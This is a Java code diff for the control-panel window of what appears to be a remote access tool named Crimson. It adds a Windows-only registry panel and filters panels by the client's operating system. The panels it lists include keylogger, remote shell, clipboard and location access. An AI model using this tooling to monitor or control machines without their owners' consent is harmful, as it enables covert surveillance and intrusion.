@@ -37,6 +37,7 @@ import javax.swing.tree.DefaultMutableTreeNode;
 import javax.swing.tree.DefaultTreeCellRenderer;
 import javax.swing.tree.DefaultTreeModel;
 
+import com.subterranean_security.crimson.core.platform.info.OS.OSFAMILY;
 import com.subterranean_security.crimson.core.profile.SimpleAttribute;
 import com.subterranean_security.crimson.core.proto.Stream.SubscriberParam;
 import com.subterranean_security.crimson.core.stream.StreamStore;
@@ -264,7 +265,7 @@ public class ClientCPFrame extends JFrame implements CPPanel {
 	}
 
 	public enum Panels {
-		CONTROLS, CLIPBOARD, WEBFILTER, DESKTOP, SHELL, LOGS, LOCATION, KEYLOGGER;
+		CONTROLS, CLIPBOARD, WEBFILTER, DESKTOP, SHELL, LOGS, LOCATION, KEYLOGGER, REGISTRY;
 
 		@Override
 		public String toString() {
@@ -284,14 +285,26 @@ public class ClientCPFrame extends JFrame implements CPPanel {
 
 			}
 		}
+
+		public boolean isValid(OSFAMILY os) {
+			switch (this) {
+			case REGISTRY:
+				return os == OSFAMILY.WIN;
+			default:
+				return true;
+
+			}
+		}
 	}
 
 	public ArrayList<Panels> getValidPanels() {
 		ArrayList<Panels> p = new ArrayList<Panels>();
-		// TODO dynamically add
-		p.add(Panels.CONTROLS);
-		p.add(Panels.KEYLOGGER);
-		p.add(Panels.LOGS);
+		for (Panels panel : Panels.values()) {
+			if (panel.isValid(profile.getOSFamily())) {
+				p.add(panel);
+			}
+
+		}
 
 		return p;
 	}
